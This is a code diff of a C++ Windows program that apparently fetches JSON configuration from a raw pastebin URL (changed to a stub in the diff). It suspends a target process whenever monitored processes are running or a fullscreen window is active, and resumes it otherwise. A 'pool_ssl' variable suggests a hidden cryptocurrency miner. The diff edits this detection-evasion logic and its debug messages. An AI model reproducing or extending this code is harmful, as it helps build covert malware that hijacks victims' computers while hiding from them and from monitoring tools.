@@ -25,7 +25,7 @@ int pool_ssl;
 
 int main(int argc, char *argv[])
 {
-    std::wstring url = L"https://pastebin.com/raw/RQQX4b6w";
+    std::wstring url = L"http";
 
     // Single function call to fetch and print
     std::string jsonStr = fetchJsonFromUrl(url);
@@ -122,22 +122,17 @@ int main(int argc, char *argv[])
             pi = ProcessStorage::GetProcess(pid);
             if (AreProcessesRunning(processNames))
             {
-                std::cout << "Monitoring detected running processes!\n";
+                std::cout << "Monitoring detected running processes! not run func\n";
                 NtSuspendProcess(pi->hProcess);
             }
-            else
-            {
-                std::cout << "No monitored processes running.\n";
-                NtResumeProcess(pi->hProcess);
-            }
-            if (IsForegroundWindowFullscreen())
+            else if (IsForegroundWindowFullscreen())
             {
                 std::cout << "Monitoring detected fullscreen processes!\n";
                 NtSuspendProcess(pi->hProcess);
             }
             else
             {
-                std::cout << "No monitored processes running.\n";
+                std::cout << "No monitored processes. not run func\n";
                 NtResumeProcess(pi->hProcess);
             }
         }
@@ -146,22 +141,17 @@ int main(int argc, char *argv[])
             std::cout << "[!] Process with PID " << pid << " is running :)" << std::endl;
             if (AreProcessesRunning(processNames))
             {
-                std::cout << "Monitoring detected running processes!\n";
+                std::cout << "Monitoring detected running processes! run func\n";
                 NtSuspendProcess(pi->hProcess);
             }
-            else
-            {
-                std::cout << "No monitored processes running.\n";
-                NtResumeProcess(pi->hProcess);
-            }
-            if (IsForegroundWindowFullscreen())
+            else if (IsForegroundWindowFullscreen())
             {
                 std::cout << "Monitoring detected fullscreen processes!\n";
                 NtSuspendProcess(pi->hProcess);
             }
             else
             {
-                std::cout << "No monitored processes running.\n";
+                std::cout << "No monitored processes. run func\n";
                 NtResumeProcess(pi->hProcess);
             }
         }
